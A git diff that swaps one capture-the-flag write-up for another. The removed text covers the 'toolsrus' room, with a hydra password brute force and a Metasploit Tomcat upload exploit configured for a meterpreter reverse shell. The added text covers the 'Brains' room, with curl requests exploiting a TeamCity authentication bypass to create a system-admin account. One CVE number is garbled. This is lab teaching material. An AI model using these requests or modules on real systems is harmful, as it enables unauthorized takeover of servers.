@@ -1,62 +1,66 @@
-# toolsrus
+---
+description: The city forgot to close its gate. - by Dex01, strategos and l000g1c
+---
+
+# Brains
+
+Write up by Amir Lahlou
+
+<div align="right"><figure><img src=".gitbook/assets/image.png" alt="" width="188"><figcaption></figcaption></figure></div>
+
+### Recon
+
+```
+// nmap scan
+nmap -sS -Pn
+```
+
+This gave us a few open ports,
+
+```
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+50000/tcp open  ibm-db2
+
+```
+
+Upon visiting the link we just get a header that says the site is under maintenance. There wasn't anything in the source code either.
+
+Let's go ahead and try a directory bruteforce then.\
+
+
+```
+// Gobuster Directory Bruteforce
+
+gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40 -o gobuster.txt
+```
 
 
 
+After the directory bruteforce finished up we don't see anything special so lets take a look at port 50000 from our nmap scan from earlier.
 
-# Recon
-Like any other room we'll start with a simple nmap scan.
-//nmap -sS -Pn toolsrus.thm
+<div align="left"><figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure></div>
 
+### Enumeration
 
-
-
-
-Lets enumerate a little more using nmap again to find out more about what's running on those ports.
-nmap -sV -sC -p80,1234,8009,22 toolsrus.thm
-
-From our nmap scan we can see 4 ports open, 22 for SSH, 80 for HTTP (Webserver), 1234 for Apache TomCat, and 8009 for ajp13. 
-Lets check out the website and see if we can find anything there.
+After visiting **`<IP>:50000/login.html`** we find a TeamCity login page running on **Version 2023.11.3 (Build 147512).**&#x20;
 
 
-All we get is a header hinting that there may be other subdomains that are up.
-Lets do a Gobuster directory bruteforce to find them.
-gobuster dir -u http://toolsrus.thm -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,git,env,sql,zip,tgz,pem,key -t 400
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 
-You can see we get a lot of results with Status: 403 meaning we don't have access to them except for /guidelines which is also the answer to our first flag.
-Hey <b>bob</b>, did you update that TomCat server?
-Visiting http://toolsrus.thm/guidelines we find which is the answer to our second flag asking us whose name we find and it is bob.
-For our 3rd flag we can take a look at the only webpage with a Status: 401 meaning its: protected.
 
-Taking a look at that protected page I think we can use hydra here. After some research this is the command we have to use.
-hydra -f -vV -l bob -P /usr/share/wordlists/rockyou.txt $toolsrus.thm http-get /protected
+With a quick google search we can find **JetBrains TeamCity CVE-2024-271-198 and CVE-2024-27199** on [Rapid7](https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/).&#x20;
 
-After 5 seconds and CPU utilization peaking at a whooping 20% we get our password bubbles.
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
-After getting into /protected we find that the page has moved to another port, after trying a couple times, 1234 is what worked.
-Here we find Apache Tomcat/7.0.88.
-Lets run Gobuster again but on this port.
+<pre class="language-msf"><code class="lang-msf"><strong>curl -ik 'http://10.201.44.80:50000/hax?jsp=/app/rest/server;.jsp'
+</strong></code></pre>
 
+<div align="left"><figure><img src=".gitbook/assets/VirtualBoxVM_9imy6r4bRM.png" alt=""><figcaption></figcaption></figure></div>
 
-Now lets use Nikto.
-nikto -host http://toolsrus.thm:1234/manager/html
-
-As you can see the server is using Apache/Coyote/1.1 and there's 5 documentations found by Nikto which is more than enough to find an exploit with Metasploit.
-msf console
-search tomcat type:exploit
-I used Metasploit to look for an exploit and after doing some research online we need to use tomcat_mgr_upload.
-
-exploit/multi/http/tomcat_mgr_upload
-info
-We can use these 2 commands to select the exploit and understand the payload.
-
-Let's set up the arguments we need.
-set RHOSTS <YOUR_TARGET_IP>
-set RPORT 1234
-set HttpUsername bob
-set HttpPassword bubbles
-set LHOST <YOUR_ATTACKER_IP>
-set LPORT 5771
-set TARGET 0
-Since it's an Apache server we need to set our target to 0 for Java.
-Nice! Now we have a meterpreter reverse shell running let's see who we are and our permissions and get our flag!
+```
+curl -ik http://10.201.44.80:50000/hax?jsp=/app/rest/users\;.jsp -X POST -H "Content-Type: application/json" --data "{\"username\": \"amiru\", \"password\": \"amiru\", \"email\": \"amiru\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}"
+```
